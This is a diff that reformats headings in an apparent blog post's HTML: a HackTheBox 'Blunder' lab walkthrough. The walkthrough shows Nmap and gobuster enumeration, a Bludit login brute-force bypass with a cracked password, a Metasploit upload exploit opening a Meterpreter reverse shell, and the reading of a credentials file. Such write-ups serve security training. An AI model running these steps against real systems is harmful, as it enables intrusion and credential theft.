@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>September 28, 2020</span> by <span>Nasef</span></p>
 <h2 class=blog-title>Blunder HackTheBox Walkthrough</h2>
+<p><span>September 28, 2020</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/007/featured-image.png alt=blog-feature-image>
 <p>Blunder is a machine in which I used an enumration and a multiple cms exploits to get a shell and then enumeration and another exploit to get root Access.</p>
-<h2 id=scanning>Scanning</h2>
+<h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>root@kali:/home/kali# nmap -sC -sV 10.10.10.191
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 10:15 EDT
@@ -76,7 +76,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds
 
 </code></pre><p>Http open and ftp closed.</p>
-<h2 id=directory-enumeration>Directory Enumeration</h2>
+<h3 id=directory-enumeration>Directory Enumeration</h3>
 <p>Then I enumerated directories and files using gobuster</p>
 <pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blunder.htb -e txt,php,html
 ===============================================================
@@ -127,7 +127,7 @@ Requests/sec.: 21.09785
 -Turn off FTP - DONE
 -Remove old users - DONE
 -Inform fergus that the new blog needs images - PENDING
-</code></pre><h2 id=bruteforce>Bruteforce</h2>
+</code></pre><h3 id=bruteforce>Bruteforce</h3>
 <p>The Login Page It contains rate limit so I searched for an exploit to bypass Rate limit and found <a href=https://raw.githubusercontent.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/master/bruteforce.py>Exploit</a></p>
 <p>If you tried the rockyou list it won&rsquo;t work so I used cewl</p>
 <pre><code>cewl http://10.10.10.191
@@ -141,7 +141,7 @@ Requests/sec.: 21.09785
 SUCCESS: Password found!
 Use fergus:RolandDeschain to login.
 
-</code></pre><h2 id=exploit>Exploit</h2>
+</code></pre><h3 id=exploit>Exploit</h3>
 <p>I searched for an exploits for bludit in metasploit and found one</p>
 <pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec 
 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set RHOSTS 10.10.10.191
@@ -161,7 +161,7 @@ msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 [*] Sending stage (38288 bytes) to 10.10.10.191
 [*] Meterpreter session 1 opened (10.10.14.110:4444 -&gt; 10.10.10.191:41004) at 2020-09-29 10:31:07 -0400
 
-</code></pre><h2 id=from-web-to-hugo>From Web to Hugo</h2>
+</code></pre><h3 id=from-web-to-hugo>From Web to Hugo</h3>
 <p>I started enumeration and found an interesting credentials in</p>
 <pre><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
 &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
